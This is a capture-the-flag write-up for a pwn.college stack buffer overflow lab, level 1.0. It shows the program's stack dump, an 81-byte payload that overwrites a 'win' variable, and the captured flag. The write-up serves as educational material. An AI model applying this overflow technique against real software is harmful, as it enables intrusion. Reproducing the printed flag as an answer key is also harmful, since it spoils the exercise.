# level1.0
## Description
Overflow a buffer on the stack to set the right conditions to obtain the flag!
## Solution
- `cd`-ing into `/challenge`, we see the file `babymem-level-1-0`. Running `./babymem-level-1-0` gives us the following output:
```
###
### Welcome to ./babymem-level-1-0!
###

The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007fff8c6d7e00 (rsp+0x0000) | 01 00 00 00 00 00 00 00 | 0x0000000000000001 |
| 0x00007fff8c6d7e08 (rsp+0x0008) | e8 8f 6d 8c ff 7f 00 00 | 0x00007fff8c6d8fe8 |
| 0x00007fff8c6d7e10 (rsp+0x0010) | d8 8f 6d 8c ff 7f 00 00 | 0x00007fff8c6d8fd8 |
| 0x00007fff8c6d7e18 (rsp+0x0018) | 51 49 26 14 01 00 00 00 | 0x0000000114264951 |
| 0x00007fff8c6d7e20 (rsp+0x0020) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
| 0x00007fff8c6d7e28 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff8c6d7e30 (rsp+0x0030) | 40 7e 6d 8c ff 7f 00 00 | 0x00007fff8c6d7e40 |
| 0x00007fff8c6d7e38 (rsp+0x0038) | 90 7e 6d 8c ff 7f 00 00 | 0x00007fff8c6d7e90 |
| 0x00007fff8c6d7e40 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff8c6d7e48 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff8c6d7e50 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff8c6d7e58 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff8c6d7e60 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff8c6d7e68 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff8c6d7e70 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff8c6d7e78 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff8c6d7e80 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff8c6d7e88 (rsp+0x0088) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff8c6d7e90 (rsp+0x0090) | 00 00 00 00 ff 7f 00 00 | 0x00007fff00000000 |
| 0x00007fff8c6d7e98 (rsp+0x0098) | 00 47 11 ba 10 6c ab 41 | 0x41ab6c10ba114700 |
| 0x00007fff8c6d7ea0 (rsp+0x00a0) | e0 8e 6d 8c ff 7f 00 00 | 0x00007fff8c6d8ee0 |
| 0x00007fff8c6d7ea8 (rsp+0x00a8) | e8 98 fb c0 48 64 00 00 | 0x00006448c0fb98e8 |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7fff8c6d7e00, and our base pointer points to 0x7fff8c6d7ea0.
This means that we have (decimal) 22 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 176 bytes.
The input buffer begins at 0x7fff8c6d7e40, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 80 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is a "win" variable.
By default, the value of this variable is zero.
However, when this variable is non-zero, the flag will be printed.
You can make this variable be non-zero by overflowing the input buffer.
The "win" variable is stored at 0x7fff8c6d7e90, 80 bytes after the start of your input buffer.

Payload size: 
```
- The program tells us that the buffer is 80 bytes long and that the `win` variable is 80 bytes after the start of the buffer. This means that we can overflow the buffer and overwrite the `win` variable with a non-zero value to get the flag. 
- Since the `win` variable is 80 bytes after the start of the buffer, we need to write 80 bytes of padding followed by a non-zero value to the buffer.
- I chose the payload size to be `81`:
```
Payload size: 81
You have chosen to send 81 bytes of input!
This will allow you to write from 0x7fff8c6d7e40 (the start of the input buffer)
right up to (but not including) 0x7fff8c6d7e91 (which is 1 bytes beyond the end of the buffer).
Send your payload (up to 81 bytes)!
```
- I chose the payload to be `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB` (80 `A`s followed by a `B`). This will overwrite the `win` variable with the value `0x42` (the ASCII value of `B`):
```
Send your payload (up to 81 bytes)!
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB
You sent 81 bytes!
Let's see what happened with the stack:

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007fff8c6d7e00 (rsp+0x0000) | 01 00 00 00 00 00 00 00 | 0x0000000000000001 |
| 0x00007fff8c6d7e08 (rsp+0x0008) | e8 8f 6d 8c ff 7f 00 00 | 0x00007fff8c6d8fe8 |
| 0x00007fff8c6d7e10 (rsp+0x0010) | d8 8f 6d 8c ff 7f 00 00 | 0x00007fff8c6d8fd8 |
| 0x00007fff8c6d7e18 (rsp+0x0018) | 51 49 26 14 01 00 00 00 | 0x0000000114264951 |
| 0x00007fff8c6d7e20 (rsp+0x0020) | 68 0d 00 00 51 00 00 00 | 0x0000005100000d68 |
| 0x00007fff8c6d7e28 (rsp+0x0028) | 51 00 00 00 00 00 00 00 | 0x0000000000000051 |
| 0x00007fff8c6d7e30 (rsp+0x0030) | 40 7e 6d 8c ff 7f 00 00 | 0x00007fff8c6d7e40 |
| 0x00007fff8c6d7e38 (rsp+0x0038) | 90 7e 6d 8c ff 7f 00 00 | 0x00007fff8c6d7e90 |
| 0x00007fff8c6d7e40 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff8c6d7e48 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff8c6d7e50 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff8c6d7e58 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff8c6d7e60 (rsp+0x0060) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff8c6d7e68 (rsp+0x0068) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff8c6d7e70 (rsp+0x0070) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff8c6d7e78 (rsp+0x0078) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff8c6d7e80 (rsp+0x0080) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff8c6d7e88 (rsp+0x0088) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff8c6d7e90 (rsp+0x0090) | 42 00 00 00 ff 7f 00 00 | 0x00007fff00000042 |
| 0x00007fff8c6d7e98 (rsp+0x0098) | 00 47 11 ba 10 6c ab 41 | 0x41ab6c10ba114700 |
| 0x00007fff8c6d7ea0 (rsp+0x00a0) | e0 8e 6d 8c ff 7f 00 00 | 0x00007fff8c6d8ee0 |
| 0x00007fff8c6d7ea8 (rsp+0x00a8) | e8 98 fb c0 48 64 00 00 | 0x00006448c0fb98e8 |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x7fff8c6d7e40
- the saved frame pointer (of main) is at 0x7fff8c6d7ea0
- the saved return address (previously to main) is at 0x7fff8c6d7ea8
- the saved return address is now pointing to 0x6448c0fb98e8.
- the canary is stored at 0x7fff8c6d7e98.
- the canary value is now 0x41ab6c10ba114700.
- the address of the win variable is 0x7fff8c6d7e90.
- the value of the win variable is 0x42.

You win! Here is your flag:
pwn.college{wtDHh5oSHygCJIacGj536uVHoxf.0VO4IDL5QTO0czW}


Goodbye!
### Goodbye!
```
- The flag is `pwn.college{wtDHh5oSHygCJIacGj536uVHoxf.0VO4IDL5QTO0czW}`.